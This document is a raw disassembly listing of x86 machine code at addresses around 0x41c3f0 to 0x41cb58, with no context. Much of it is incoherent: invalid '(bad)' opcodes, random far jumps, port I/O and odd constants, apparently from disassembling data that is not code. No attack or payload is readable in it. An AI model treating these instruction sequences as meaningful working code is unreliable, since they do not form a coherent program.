  41c3f0:	dec    ecx
  41c3f1:	mov    ah,0x61
  41c3f3:	inc    edi
  41c3f4:	(bad)  
  41c3f6:	mov    ds:0x89e4abea,eax
  41c3fb:	jno    0x41c416
  41c3fd:	push   es
  41c3fe:	sub    al,0x63
  41c400:	add    DWORD PTR [ebx+0x2b446668],ecx
  41c406:	out    0x79,eax
  41c408:	mov    ah,0x58
  41c40a:	or     BYTE PTR [edx+0x2],0x54
  41c40e:	mov    bl,0xbf
  41c410:	cli    
  41c411:	ret    
  41c412:	cdq    
  41c413:	mov    cl,0x1a
  41c415:	jp     0x41c46d
  41c417:	pop    edx
  41c418:	jmp    0x55ed:0x820f87f
  41c41f:	rol    BYTE PTR [edi+0x34],0xb3
  41c423:	das    
  41c424:	fidivr DWORD PTR [eax+0x55d88f30]
  41c42a:	xchg   edi,eax
  41c42b:	xor    BYTE PTR [eax+0x6a],dh
  41c42e:	adc    ch,bl
  41c430:	pop    esi
  41c431:	icebp  
  41c432:	sahf   
  41c433:	setno  ah
  41c436:	aaa    
  41c437:	sub    al,0x46
  41c439:	ret    
  41c43a:	into   
  41c43b:	sbb    DWORD PTR [ebx+0xdfd7464],esp
  41c441:	call   DWORD PTR ds:0xb0d1d116
  41c447:	jbe    0x41c406
  41c449:	je     0x41c3e2
  41c44b:	aad    0x8a
  41c44d:	inc    edi
  41c44e:	ins    BYTE PTR es:[edi],dx
  41c44f:	pop    ebx
  41c450:	sub    eax,0xa8b5d4a
  41c455:	mov    BYTE PTR [ebp+0x76],bh
  41c458:	stos   DWORD PTR es:[edi],eax
  41c459:	shl    BYTE PTR [ebx+0x78],0xe8
  41c45d:	jbe    0x41c493
  41c45f:	out    dx,eax
  41c460:	je     0x41c4a9
  41c462:	leave  
  41c463:	retf   
  41c464:	scas   al,BYTE PTR es:[edi]
  41c465:	push   cs
  41c466:	out    0x79,eax
  41c468:	stos   BYTE PTR es:[edi],al
  41c469:	add    BYTE PTR [edi+0x57527df4],bl
  41c46f:	shl    BYTE PTR [edi+0x7c],0x1e
  41c473:	stc    
  41c474:	ror    BYTE PTR [edx-0x3f529801],0xcd
  41c47b:	mov    bh,0x31
  41c47d:	dec    esp
  41c47e:	into   
  41c47f:	les    esi,FWORD PTR [esi-0x2d]
  41c482:	xchg   edi,eax
  41c483:	clc    
  41c484:	bound  ebx,QWORD PTR [edx-0x6e]
  41c487:	popa   
  41c488:	inc    ebp
  41c489:	nop
  41c48a:	pop    edx
  41c48b:	push   esp
  41c48c:	xlat   BYTE PTR ds:[ebx]
  41c48d:	aaa    
  41c48e:	jg     0x41c480
  41c490:	lahf   
  41c491:	inc    ecx
  41c492:	adc    eax,0x5a0abc7
  41c497:	mov    eax,ds:0x23e8f9ef
  41c49c:	fmul   DWORD PTR [edi+0xa]
  41c49f:	imul   ebp,DWORD PTR [eax],0x29
  41c4a2:	std    
  41c4a3:	(bad)  
  41c4a4:	imul   esp,DWORD PTR [edi-0x72],0x81b439e7
  41c4ab:	jae    0x41c4aa
  41c4ad:	pop    eax
  41c4ae:	aam    0xca
  41c4b0:	into   
  41c4b1:	add    bh,dh
  41c4b3:	jb     0x41c4fd
  41c4b5:	inc    ebx
  41c4b6:	shl    DWORD PTR [esi+esi*2],cl
  41c4b9:	(bad)  
  41c4ba:	aas    
  41c4bb:	push   es
  41c4bc:	(bad)  
  41c4bd:	add    ecx,DWORD PTR [edx+0x2e]
  41c4c0:	test   BYTE PTR [edx+0x4c68114d],bl
  41c4c6:	jns    0x41c51f
  41c4c8:	xlat   BYTE PTR ds:[ebx]
  41c4c9:	out    0x62,eax
  41c4cb:	inc    edx
  41c4cc:	das    
  41c4cd:	xchg   ebx,esi
  41c4cf:	jbe    0x41c54f
  41c4d1:	push   0x358f155
  41c4d6:	cmp    edx,DWORD PTR [eax+eax*8]
  41c4d9:	(bad)  
  41c4da:	js     0x41c511
  41c4dc:	int3   
  41c4dd:	and    eax,0x465ea383
  41c4e2:	inc    eax
  41c4e3:	sbb    BYTE PTR [eax-0x23],dh
  41c4e6:	stos   DWORD PTR es:[edi],eax
  41c4e7:	inc    DWORD PTR [edi]
  41c4e9:	js     0x41c542
  41c4eb:	clc    
  41c4ec:	add    al,0x43
  41c4ee:	ret    
  41c4ef:	mov    eax,0x6887b109
  41c4f4:	or     al,0x74
  41c4f6:	inc    edi
  41c4f7:	xor    ebp,DWORD PTR [edi+edx*8]
  41c4fa:	push   ss
  41c4fb:	cdq    
  41c4fc:	aad    0x94
  41c4fe:	adc    esp,esp
  41c500:	mov    ch,BYTE PTR [edx-0x39]
  41c503:	out    dx,al
  41c504:	shr    DWORD PTR [ecx],cl
  41c506:	out    dx,eax
  41c507:	mov    ch,0xe0
  41c509:	and    al,0x0
  41c50b:	inc    ebx
  41c50c:	repnz into 
  41c50e:	mov    ah,0x7a
  41c510:	aad    0xd8
  41c512:	mov    ah,0xc6
  41c514:	xlat   BYTE PTR ds:[ebx]
  41c515:	sub    DWORD PTR [ebx-0x4e],esi
  41c518:	fcmovu st,st(2)
  41c51a:	into   
  41c51b:	jbe    0x41c4fd
  41c51d:	arpl   WORD PTR [ebx],dx
  41c51f:	jmp    0x41c51c
  41c521:	cmc    
  41c522:	aad    0x8
  41c524:	out    0x82,eax
  41c526:	inc    eax
  41c527:	call   0x525f:0xd6038981
  41c52e:	jbe    0x41c585
  41c530:	xchg   DWORD PTR [eax],eax
  41c532:	div    BYTE PTR es:[ebx+0x7012d37f]
  41c539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c53a:	pusha  
  41c53b:	lahf   
  41c53c:	xchg   esp,eax
  41c53d:	pop    ebx
  41c53e:	int    0x4e
  41c540:	outs   dx,BYTE PTR ds:[esi]
  41c541:	ret    
  41c542:	rcr    BYTE PTR [edx+0x60],cl
  41c545:	or     eax,ebx
  41c547:	pop    esp
  41c548:	pmulhw mm2,QWORD PTR [edx]
  41c54b:	mov    ch,0xfb
  41c54d:	and    DWORD PTR [esi+0x5b],ebp
  41c550:	enter  0x6d7b,0x50
  41c554:	jns    0x41c517
  41c556:	and    BYTE PTR [ebp+edx*2+0x7c],ch
  41c55a:	arpl   WORD PTR [eax+0x18984560],di
  41c560:	push   edx
  41c561:	pop    esp
  41c562:	adc    al,dh
  41c564:	push   edi
  41c565:	mov    edx,0x77a38405
  41c56a:	sti    
  41c56b:	int    0xe7
  41c56d:	je     0x41c55f
  41c56f:	popf   
  41c570:	mov    ecx,0xbd795ef4
  41c575:	(bad)
  41c578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c579:	jb     0x41c50d
  41c57b:	shl    al,0xc5
  41c57e:	mov    al,ds:0x3c206275
  41c583:	and    eax,0x5abe1ec
  41c588:	ins    BYTE PTR es:[edi],dx
  41c589:	xchg   ecx,eax
  41c58a:	leave  
  41c58b:	sub    al,0x7d
  41c58d:	daa    
  41c58e:	fmul   DWORD PTR [edx]
  41c590:	pop    ds
  41c591:	mov    ch,0xdf
  41c593:	xchg   DWORD PTR [ebp-0x3aa3820a],ebp
  41c599:	pop    ebp
  41c59a:	daa    
  41c59b:	stos   DWORD PTR es:[edi],eax
  41c59c:	or     edi,eax
  41c59e:	int    0x20
  41c5a0:	fstp   QWORD PTR [ecx]
  41c5a2:	mov    ds:0xbdb58be2,eax
  41c5a7:	and    edx,DWORD PTR [esi+esi*8+0x3b]
  41c5ab:	pop    ebp
  41c5ac:	je     0x41c5b9
  41c5ae:	xor    eax,0xa7ab5746
  41c5b3:	xchg   edi,eax
  41c5b4:	pop    edx
  41c5b5:	add    BYTE PTR [ecx],0x52
  41c5b8:	loope  0x41c596
  41c5ba:	(bad)  
  41c5bb:	push   0x13c70c9a
  41c5c0:	clc    
  41c5c1:	mov    BYTE PTR [esp+ecx*4-0x35],dl
  41c5c5:	je     0x41c629
  41c5c7:	adc    al,0x8f
  41c5c9:	push   edx
  41c5ca:	inc    eax
  41c5cb:	mov    esi,0x144753b7
  41c5d0:	addr16 sub esp,esi
  41c5d3:	(bad)  
  41c5d4:	jmp    0x3615:0x8e3d5854
  41c5db:	ret    
  41c5dc:	scas   eax,DWORD PTR es:[edi]
  41c5dd:	rcl    dl,cl
  41c5df:	loop   0x41c5b0
  41c5e1:	aad    0x6c
  41c5e3:	or     BYTE PTR [edx-0x29bd15da],ah
  41c5e9:	mov    ds:0xa082e325,al
  41c5ee:	push   0x75f3d971
  41c5f3:	xchg   edi,eax
  41c5f4:	in     al,dx
  41c5f5:	in     al,dx
  41c5f6:	add    al,0x20
  41c5f8:	mov    ebx,0x9e410258
  41c5fd:	pop    eax
  41c5fe:	jl     0x41c582
  41c600:	mov    edi,0x6f737ee2
  41c605:	rcl    bl,0x75
  41c608:	cmp    al,0x3d
  41c60a:	xchg   BYTE PTR [edi+0x6b],bh
  41c60d:	fisub  DWORD PTR [ecx-0x2c]
  41c610:	aam    0x19
  41c612:	dec    esi
  41c613:	sbb    ch,0xfc
  41c616:	xor    cl,dl
  41c618:	sub    DWORD PTR [edx],0xf46b0c8d
  41c61e:	popf   
  41c61f:	outs   dx,DWORD PTR ds:[esi]
  41c620:	xchg   edx,eax
  41c621:	outs   dx,BYTE PTR ds:[esi]
  41c622:	xchg   ebx,eax
  41c623:	push   ebx
  41c624:	and    esp,DWORD PTR [eax]
  41c626:	jg     0x41c5e7
  41c628:	test   DWORD PTR [edx+0x23],ebx
  41c62b:	and    dl,BYTE PTR [ebx]
  41c62d:	mov    al,0x40
  41c62f:	xchg   DWORD PTR [eax],edi
  41c631:	daa    
  41c632:	stc    
  41c633:	cmp    ebx,DWORD PTR [eax-0x5fbd2bf1]
  41c639:	call   0x13c9:0xb039c86e
  41c640:	fcomp  QWORD PTR [edi]
  41c642:	cli    
  41c643:	push   ebp
  41c644:	and    DWORD PTR [esi-0x36],edx
  41c647:	imul   ebx,ecx,0xfffffff1
  41c64a:	cmp    BYTE PTR [ecx],bl
  41c64c:	(bad)  
  41c64d:	push   ecx
  41c64e:	clc    
  41c64f:	dec    edx
  41c650:	cmp    BYTE PTR [ebp+0x7c],bh
  41c653:	aad    0x20
  41c655:	out    0xe,al
  41c657:	stos   DWORD PTR es:[edi],eax
  41c658:	inc    edi
  41c659:	outs   dx,DWORD PTR ds:[esi]
  41c65a:	outs   dx,DWORD PTR ds:[esi]
  41c65b:	mov    bh,0xab
  41c65d:	sub    DWORD PTR [edx-0x513df2a],eax
  41c663:	mov    BYTE PTR [eax+0x9331c5],cl
  41c669:	add    ebp,DWORD PTR [ebx]
  41c66b:	add    eax,0x4ac1a44b
  41c670:	sub    al,0xba
  41c672:	and    eax,0x4b01fd85
  41c677:	xchg   ebx,eax
  41c678:	aad    0x85
  41c67a:	mov    ah,0xe7
  41c67c:	adc    eax,0x9f0905b1
  41c681:	push   cs
  41c682:	jnp    0x41c6d6
  41c684:	dec    edx
  41c685:	pop    ebx
  41c686:	rol    BYTE PTR [edi+0x1a637952],cl
  41c68c:	add    BYTE PTR [edi-0x72613b6e],cl
  41c692:	and    DWORD PTR [esi+0x20b56734],ecx
  41c698:	(bad)  
  41c699:	je     0x41c642
  41c69b:	xchg   esp,eax
  41c69c:	pop    esp
  41c69d:	pusha  
  41c69e:	jbe    0x41c6d2
  41c6a0:	je     0x41c6f1
  41c6a2:	jmp    0xc170:0x7e55eeaf
  41c6a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6aa:	(bad)  
  41c6ab:	xor    edi,edi
  41c6ad:	xchg   ebx,eax
  41c6ae:	inc    ebp
  41c6af:	inc    eax
  41c6b0:	fisub  WORD PTR [eax-0x8]
  41c6b3:	push   cs
  41c6b4:	stc    
  41c6b5:	ja     0x41c6d3
  41c6b7:	repnz int 0x19
  41c6ba:	xor    DWORD PTR [eax],0xd5effa60
  41c6c0:	jp     0x41c692
  41c6c2:	fidiv  WORD PTR [edx+0x5b]
  41c6c5:	pop    edx
  41c6c6:	test   al,dl
  41c6c8:	aam    0x67
  41c6ca:	dec    esp
  41c6cb:	inc    eax
  41c6cc:	mov    al,ds:0x75bcd77e
  41c6d1:	sar    DWORD PTR [ebx+0x20d0862a],0xab
  41c6d8:	add    BYTE PTR [edx-0x43049b5f],bh
  41c6de:	sahf   
  41c6df:	push   0x1412bbe5
  41c6e4:	std    
  41c6e5:	lds    esi,FWORD PTR [edi]
  41c6e7:	cmp    eax,0x6dc8a17f
  41c6ec:	xchg   ebp,eax
  41c6ed:	jmp    0xf125:0x5be91dc4
  41c6f4:	lahf   
  41c6f5:	xchg   ebx,eax
  41c6f6:	mov    esi,0x9b1b1b34
  41c6fb:	dec    edx
  41c6fc:	or     al,BYTE PTR [eax]
  41c6fe:	sbb    BYTE PTR [ecx],dl
  41c700:	push   es
  41c701:	and    al,0x4a
  41c703:	test   eax,0x7df463a6
  41c708:	pop    esp
  41c709:	cmp    edx,edx
  41c70b:	mov    al,ds:0x1b8bab7d
  41c710:	pop    ds
  41c711:	pop    ss
  41c712:	and    BYTE PTR [ebp-0xc],ah
  41c715:	mov    ebp,0x17b87c73
  41c71a:	fs sub ecx,ecx
  41c71d:	mov    ds:0x89773984,al
  41c722:	out    0xba,al
  41c724:	pop    es
  41c725:	out    0xa6,al
  41c727:	xchg   edx,eax
  41c728:	jae    0x41c6d7
  41c72a:	stos   DWORD PTR es:[edi],eax
  41c72b:	jmp    0x6236:0x6b3de3f0
  41c732:	aam    0xa0
  41c734:	xchg   edx,eax
  41c735:	mov    edi,DWORD PTR [eax+ebx*4]
  41c738:	xor    DWORD PTR [edx-0x2a],edi
  41c73b:	adc    edx,0x6201dde5
  41c741:	test   DWORD PTR [ecx-0x3e],esi
  41c744:	pop    eax
  41c745:	stos   BYTE PTR es:[edi],al
  41c746:	push   ebx
  41c747:	jnp    0x41c7ae
  41c749:	stc    
  41c74a:	into   
  41c74b:	inc    edi
  41c74c:	stc    
  41c74d:	jmp    0x6d9a3c3b
  41c752:	call   0x1bd7cdcc
  41c757:	xor    eax,0x17e7e5c9
  41c75c:	cmp    al,0xf
  41c75e:	fistp  QWORD PTR [esi+0x3f16b58b]
  41c764:	in     al,dx
  41c765:	je     0x41c78b
  41c767:	es out 0x50,al
  41c76a:	js     0x41c7ad
  41c76c:	stos   BYTE PTR es:[edi],al
  41c76d:	sbb    DWORD PTR [ecx+0x744bd66],0x130bfbed
  41c777:	jo     0x41c79d
  41c779:	out    0x3f,eax
  41c77b:	ror    DWORD PTR [ebp-0xb],0x99
  41c77f:	retf   0xb587
  41c782:	iret   
  41c783:	call   0xc99edd1e
  41c788:	fucomp st(0)
  41c78a:	bound  ecx,QWORD PTR [edx+0x4a9bc561]
  41c790:	dec    ebp
  41c791:	inc    ebp
  41c792:	mov    ebx,0xb3f4a6b0
  41c797:	hlt    
  41c798:	xor    ebp,DWORD PTR [ebp+0x71]
  41c79b:	cmp    bl,BYTE PTR [ebp+0x53]
  41c79e:	je     0x41c725
  41c7a0:	les    ecx,FWORD PTR [ebp+ebx*4+0x3fb141ab]
  41c7a7:	sbb    ebp,edx
  41c7a9:	jo     0x41c7f7
  41c7ab:	mov    DWORD PTR [edi-0x2e153345],ebx
  41c7b1:	repz pop esp
  41c7b3:	pushf  
  41c7b4:	adc    al,0x40
  41c7b6:	add    eax,DWORD PTR [eax-0x20a8e3ea]
  41c7bc:	xor    esi,DWORD PTR [esi+esi*4]
  41c7bf:	fldcw  WORD PTR [ecx-0x25]
  41c7c2:	repz sbb DWORD PTR ds:0x4643a935,edx
  41c7c9:	inc    edx
  41c7ca:	cwde   
  41c7cb:	xchg   esi,eax
  41c7cc:	xor    ch,bh
  41c7ce:	mov    edi,0x5090ce64
  41c7d3:	fbstp  TBYTE PTR ds:0x6861c463
  41c7d9:	push   cs
  41c7da:	push   edi
  41c7db:	in     al,dx
  41c7dc:	and    al,0xa5
  41c7de:	add    al,0x7a
  41c7e0:	mov    bl,0x92
  41c7e2:	cli    
  41c7e3:	mov    ch,0x8d
  41c7e5:	sbb    ebp,DWORD PTR [ebx-0x2cff57ef]
  41c7eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7ec:	loop   0x41c7bb
  41c7ee:	jmp    0x1ee5:0x7301083b
  41c7f5:	lea    eax,[eax]
  41c7f7:	lahf   
  41c7f8:	mov    esp,DWORD PTR [eax-0x6329662c]
  41c7fe:	leave  
  41c7ff:	imul   ebx,DWORD PTR [esi-0x57],0xffffffaa
  41c803:	jl     0x41c7dc
  41c805:	ret    0x8dad
  41c808:	push   ebp
  41c809:	sub    eax,0xfd6471c3
  41c80e:	xchg   edi,eax
  41c80f:	pop    ebx
  41c810:	add    cl,BYTE PTR [ebx-0x7e]
  41c813:	jne    0x41c883
  41c815:	mov    bh,0x47
  41c817:	iret   
  41c818:	sub    cl,dh
  41c81a:	mov    esi,0x761c150f
  41c81f:	xchg   esi,eax
  41c820:	and    DWORD PTR gs:[esi],edi
  41c823:	test   bl,bh
  41c825:	mov    dh,0x18
  41c827:	jle    0x41c7b1
  41c829:	lods   eax,DWORD PTR ds:[esi]
  41c82a:	fiadd  DWORD PTR [ebx-0xcaf5f7c]
  41c830:	call   0x3418:0x964c4c24
  41c837:	cmp    edx,edi
  41c839:	xor    bx,dx
  41c83c:	sbb    ah,BYTE PTR [edi]
  41c83e:	loopne 0x41c8b6
  41c840:	fldcw  WORD PTR [ebp+0x4b]
  41c843:	aam    0x35
  41c845:	jb     0x41c87a
  41c847:	pop    ds
  41c848:	mov    edi,0x413d8309
  41c84d:	scas   al,BYTE PTR es:[edi]
  41c84e:	xchg   BYTE PTR ds:0x7578a0d9,ah
  41c854:	mov    dl,0x7c
  41c856:	adc    eax,DWORD PTR [edi]
  41c858:	rcr    BYTE PTR [eax-0x74],1
  41c85b:	(bad)  [ecx-0x6089b43b]
  41c861:	mov    DWORD PTR [edx],ebp
  41c863:	dec    esi
  41c864:	ins    BYTE PTR es:[edi],dx
  41c865:	cmp    DWORD PTR [edi],eax
  41c867:	(bad)  
  41c868:	fisub  WORD PTR [eax-0x5938eb58]
  41c86e:	dec    ebx
  41c86f:	stc    
  41c870:	mov    ecx,0x3811d0d
  41c875:	jmp    0x428:0x5aac7e0f
  41c87c:	mov    edx,0x781ccd93
  41c881:	nop
  41c882:	mov    ch,0xbc
  41c884:	dec    ebp
  41c885:	adc    eax,0x6aeb0b86
  41c88a:	sub    al,0x2
  41c88c:	inc    ecx
  41c88d:	rcl    BYTE PTR [eax-0x1d],1
  41c890:	aaa    
  41c891:	push   edi
  41c892:	in     eax,dx
  41c893:	stos   DWORD PTR es:[edi],eax
  41c894:	mov    BYTE PTR [ecx+0x21],ch
  41c897:	mov    esi,0x33c9a82e
  41c89c:	adc    BYTE PTR ds:0xb0b349cf,dl
  41c8a2:	pop    ss
  41c8a3:	add    al,0xa8
  41c8a5:	pop    esp
  41c8a6:	fild   WORD PTR [edi-0x654b8077]
  41c8ac:	imul   ebp,DWORD PTR [edi+ecx*2],0xbef13ac2
  41c8b3:	jmp    FWORD PTR [eax]
  41c8b5:	adc    eax,0xa4e7b617
  41c8ba:	aam    0x9c
  41c8bc:	mov    ebx,0x5371b2ca
  41c8c1:	in     al,0x62
  41c8c3:	es sbb bl,ah
  41c8c6:	cmp    al,0x3d
  41c8c8:	xor    eax,0x2aa1b48e
  41c8cd:	inc    esi
  41c8ce:	xchg   ecx,eax
  41c8cf:	in     al,dx
  41c8d0:	or     bl,BYTE PTR [edi-0x10a86a33]
  41c8d6:	xor    BYTE PTR [ebx+0x4178aa9],0x70
  41c8dd:	popa   
  41c8de:	mov    eax,ds:0x77d18faf
  41c8e3:	adc    al,0xd
  41c8e5:	jns    0x41c8e8
  41c8e7:	loopne 0x41c88c
  41c8e9:	dec    edx
  41c8ea:	sbb    DWORD PTR [esi+0x5b281088],edx
  41c8f0:	mov    ebx,0x75df1d8a
  41c8f5:	shl    BYTE PTR [ebp+0x5d],0x43
  41c8f9:	xor    BYTE PTR [esi+eiz*2],dh
  41c8fc:	sub    bl,bh
  41c8fe:	(bad)  
  41c8ff:	and    al,0x36
  41c901:	xchg   esi,ebx
  41c903:	pusha  
  41c904:	mov    al,ds:0x880a17e5
  41c909:	adc    dh,dh
  41c90b:	sbb    ah,BYTE PTR [esi]
  41c90d:	mov    ds:0x56427e91,eax
  41c912:	push   esi
  41c913:	mov    esi,0xf37d870
  41c918:	or     eax,0x4a0cb07a
  41c91d:	pop    ss
  41c91e:	lock mov es,WORD PTR [edx+0x7e]
  41c922:	jno    0x41c915
  41c924:	popf   
  41c925:	(bad)  
  41c926:	sbb    BYTE PTR [esi],bh
  41c928:	shr    BYTE PTR [ecx],cl
  41c92a:	mov    eax,0x70222303
  41c92f:	ror    DWORD PTR [ecx+0xfc1d7b1],0xf1
  41c936:	pushf  
  41c937:	ret    0xcfa0
  41c93a:	and    DWORD PTR [esi+eax*1-0x75],ecx
  41c93e:	leave  
  41c93f:	out    0xe0,eax
  41c941:	inc    esp
  41c942:	xchg   edx,eax
  41c943:	scas   al,BYTE PTR es:[edi]
  41c944:	inc    eax
  41c945:	dec    al
  41c947:	adc    BYTE PTR [ebp+0x5f21743f],ch
  41c94d:	cwde   
  41c94e:	push   es
  41c94f:	add    eax,esi
  41c951:	sti    
  41c952:	das    
  41c953:	push   ebx
  41c954:	cmp    eax,0x2080b57
  41c959:	jge    0x41c986
  41c95b:	mov    esi,0xddea2420
  41c960:	fldenv [edx-0xf]
  41c963:	jmp    0xabc95b9b
  41c968:	aaa    
  41c969:	mov    ss,WORD PTR [eax+0x2e]
  41c96c:	inc    edx
  41c96d:	fmul   st,st(4)
  41c96f:	ins    BYTE PTR es:[edi],dx
  41c970:	popf   
  41c971:	add    al,0x7e
  41c973:	scas   al,BYTE PTR es:[edi]
  41c974:	test   al,0x95
  41c976:	and    edi,esp
  41c978:	cwde   
  41c979:	jnp    0x41c952
  41c97b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c97c:	out    dx,eax
  41c97d:	call   0x12000ed4
  41c982:	lods   al,BYTE PTR ds:[esi]
  41c983:	adc    BYTE PTR ds:0x1d32206f,0x8
  41c98a:	dec    ebx
  41c98b:	mov    al,ds:0x8f597186
  41c990:	cmp    BYTE PTR [ecx-0x7f],dl
  41c993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c994:	push   edx
  41c995:	or     ebx,DWORD PTR [ebx+0x7]
  41c998:	cmp    bh,BYTE PTR [ecx]
  41c99a:	sub    edx,DWORD PTR [eax+eiz*1+0x1801b57f]
  41c9a1:	pop    edi
  41c9a2:	mov    WORD PTR es:[edi+0x2a9f6f5e],?
  41c9a9:	push   ebp
  41c9aa:	adc    eax,0x62895321
  41c9af:	xchg   edi,eax
  41c9b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9b1:	cmp    edi,esi
  41c9b3:	mov    edx,0x47567d
  41c9b8:	retf   
  41c9b9:	sub    al,0x2e
  41c9bb:	jg     0x41c99b
  41c9bd:	fisttp DWORD PTR [ebx]
  41c9bf:	lods   eax,DWORD PTR ds:[esi]
  41c9c0:	mov    cl,0x13
  41c9c2:	jb     0x41c969
  41c9c4:	xor    al,0x87
  41c9c6:	xchg   edi,eax
  41c9c7:	call   0xd262:0x5f189572
  41c9ce:	popa   
  41c9cf:	loop   0x41c96b
  41c9d1:	ror    DWORD PTR [edi],cl
  41c9d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9d4:	clc    
  41c9d5:	xor    ecx,DWORD PTR [ecx]
  41c9d7:	(bad)  
  41c9d8:	pushf  
  41c9d9:	push   eax
  41c9da:	or     ch,bl
  41c9dc:	aaa    
  41c9dd:	inc    DWORD PTR [eax]
  41c9df:	or     esi,DWORD PTR [eax]
  41c9e1:	add    DWORD PTR [ebx-0x41dea3a],ebx
  41c9e7:	add    DWORD PTR [ecx],edi
  41c9e9:	ret    0xe28c
  41c9ec:	sar    DWORD PTR [ebx+0x36],1
  41c9ef:	mov    esi,DWORD PTR [ebx+0x3]
  41c9f2:	mov    dh,0x25
  41c9f4:	and    BYTE PTR ds:0x78805405,al
  41c9fa:	pop    eax
  41c9fb:	pop    ecx
  41c9fc:	in     al,dx
  41c9fd:	inc    eax
  41c9fe:	ret    
  41c9ff:	push   esp
  41ca00:	or     edi,esi
  41ca02:	fimul  WORD PTR [eax]
  41ca04:	fistp  WORD PTR [esi+0x1f15c0ad]
  41ca0a:	inc    edx
  41ca0b:	ss jne 0x41c9ea
  41ca0e:	loopne 0x41c9f5
  41ca10:	inc    ecx
  41ca11:	xor    eax,0x55036e14
  41ca16:	lds    edi,FWORD PTR [esi]
  41ca18:	pop    eax
  41ca19:	xor    DWORD PTR [edi+0x2f],0xf47503f8
  41ca20:	ins    DWORD PTR es:[edi],dx
  41ca21:	inc    ecx
  41ca22:	or     DWORD PTR [eax-0x42],ebp
  41ca25:	(bad)
  41ca29:	shl    BYTE PTR [ecx+eax*8],1
  41ca2c:	aas    
  41ca2d:	sub    dh,BYTE PTR [edi]
  41ca2f:	stos   DWORD PTR es:[edi],eax
  41ca30:	hlt    
  41ca31:	(bad)  
  41ca33:	mov    al,0x7
  41ca35:	in     al,dx
  41ca36:	pop    esp
  41ca37:	mov    esi,0x48f9e0b5
  41ca3c:	cmp    BYTE PTR [esi+0x4],bh
  41ca3f:	dec    ebx
  41ca40:	sbb    DWORD PTR [si],ecx
  41ca43:	and    edx,DWORD PTR [eiz*4-0x22e77f27]
  41ca4a:	or     edi,DWORD PTR [ecx+edx*8+0x1f]
  41ca4e:	jbe    0x41cac3
  41ca50:	sar    DWORD PTR [edx+ebx*8+0x53398a05],cl
  41ca57:	push   ebx
  41ca58:	and    eax,eax
  41ca5a:	sub    dl,dh
  41ca5c:	ret    
  41ca5d:	and    BYTE PTR [ecx],bl
  41ca5f:	jle    0x41ca08
  41ca61:	stos   BYTE PTR es:[edi],al
  41ca62:	call   0x55b5:0xac5f0ccb
  41ca69:	push   esi
  41ca6a:	lock adc al,0x53
  41ca6d:	mov    ds:0xded585e4,eax
  41ca72:	fldenv [ecx-0x167e2e40]
  41ca78:	in     al,0x62
  41ca7a:	les    edi,FWORD PTR [esi-0x45ae2a36]
  41ca80:	je     0x41ca27
  41ca82:	xor    eax,0x479a479a
  41ca87:	ret    0xa4aa
  41ca8a:	or     ecx,DWORD PTR [edx]
  41ca8c:	popa   
  41ca8d:	xor    DWORD PTR [ebp-0x3b],edi
  41ca90:	sub    ebx,esi
  41ca92:	aaa    
  41ca93:	(bad)  
  41ca94:	repz repz push ecx
  41ca97:	maskmovq mm0,(bad)
  41ca98:	test   DWORD PTR [edi],0xd3727825
  41ca9e:	repz or eax,0x31fe7ed8
  41caa4:	inc    esi
  41caa5:	int    0x53
  41caa7:	inc    ebx
  41caa8:	inc    esi
  41caa9:	ss (bad) 
  41caab:	fcom   st(1)
  41caad:	ds loope 0x41cb0a
  41cab0:	inc    esi
  41cab1:	dec    esp
  41cab2:	ret    
  41cab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cab4:	mov    edi,0xbb5b7ca9
  41cab9:	or     dh,BYTE PTR [edi]
  41cabb:	retf   
  41cabc:	pop    ebp
  41cabd:	adc    DWORD PTR [ebx+0x5e362e22],eax
  41cac3:	adc    al,0x4b
  41cac5:	stc    
  41cac6:	pop    ds
  41cac7:	cwde   
  41cac8:	add    dl,0x9e
  41cacb:	mov    dh,0x20
  41cacd:	jnp    0x41caeb
  41cacf:	or     bh,BYTE PTR [edi-0x5d9376e8]
  41cad5:	xchg   ebx,eax
  41cad6:	push   ds
  41cad7:	js     0x41cade
  41cad9:	or     al,0xaa
  41cadb:	sbb    ah,al
  41cadd:	mov    WORD PTR [ecx+0x1b],es
  41cae0:	outs   dx,DWORD PTR ds:[esi]
  41cae1:	cli    
  41cae2:	mov    es,ebp
  41cae4:	lods   al,BYTE PTR ds:[esi]
  41cae5:	push   esi
  41cae6:	popf   
  41cae7:	in     eax,dx
  41cae8:	push   0x2e
  41caea:	lahf   
  41caeb:	retf   0xd978
  41caee:	push   esi
  41caef:	mov    bl,0x3f
  41caf1:	gs in  al,0x1d
  41caf4:	mov    edi,0xa7f388dd
  41caf9:	xor    BYTE PTR [eax],0x82
  41cafc:	xor    esp,DWORD PTR [esi+0x37]
  41caff:	and    ebx,esp
  41cb01:	or     BYTE PTR [edx+ecx*8],bl
  41cb04:	and    eax,0x1db2566e
  41cb09:	shl    ecx,0x1a
  41cb0c:	leave  
  41cb0d:	xchg   edx,eax
  41cb0e:	sub    al,0x65
  41cb10:	pop    ss
  41cb11:	jmp    0xec242bb0
  41cb16:	mov    bh,0xc4
  41cb18:	loope  0x41cade
  41cb1a:	cmp    DWORD PTR [edi],ebp
  41cb1c:	arpl   WORD PTR [ebp-0x53e31831],bx
  41cb22:	call   0xcbdc803f
  41cb27:	and    cl,bh
  41cb29:	xor    eax,0x5fa5d0ca
  41cb2e:	outs   dx,BYTE PTR ds:[esi]
  41cb2f:	add    ah,BYTE PTR [ecx*2+0x3127b9f9]
  41cb36:	bound  edi,QWORD PTR [ebp+0xf7219ab]
  41cb3c:	sti    
  41cb3d:	inc    esp
  41cb3e:	push   cs
  41cb3f:	pop    ebx
  41cb40:	pop    ss
  41cb41:	mov    ds:0x7e8de2a2,al
  41cb46:	in     eax,dx
  41cb47:	inc    ebp
  41cb48:	add    eax,0x2349a0c2
  41cb4d:	inc    ebx
  41cb4e:	div    DWORD PTR [ebx]
  41cb50:	mov    al,0x61
  41cb52:	xchg   bl,al
  41cb54:	sbb    ah,BYTE PTR [eax]
  41cb56:	pop    ds
  41cb57:	icebp  
  41cb58:	mov    edi,0xdc428eea
